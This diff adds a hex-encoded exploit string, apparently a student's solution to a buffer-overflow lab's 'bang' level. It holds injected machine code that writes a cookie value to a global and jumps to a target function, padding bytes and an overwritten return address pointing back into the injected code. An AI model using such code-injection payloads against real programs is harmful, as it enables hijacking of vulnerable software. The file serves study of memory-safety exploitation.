@@ -1,0 +1,10 @@
+c7 05 /* some instruction */
+e4 c1 04 08 /* $eax at bang */
+1d 15 5e 62 /* my cookie */
+68
+d4 8b 04 08 /* bang entry */
+c3
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 18 b0 0f 80  /* go back to eax at third line */
